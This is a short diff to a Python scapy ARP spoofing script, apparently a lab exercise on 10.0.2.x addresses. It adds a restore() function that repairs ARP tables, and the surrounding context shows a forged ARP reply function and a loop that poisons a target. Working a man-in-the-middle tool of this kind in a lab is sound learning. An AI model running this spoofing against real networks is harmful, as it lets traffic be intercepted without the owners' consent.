@@ -31,8 +31,12 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # tester mac address automatically inserted here
     scapy.send(packet, verbose=False)
     
-sent_packets_num = 0
+def restore(dest_ip, source_ip):
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
+    scapy.send(packet, verbose=False)
 
+    
+sent_packets_num = 0
 try:
     while True:
         spoof("10.0.2.2", "10.0.2.1")
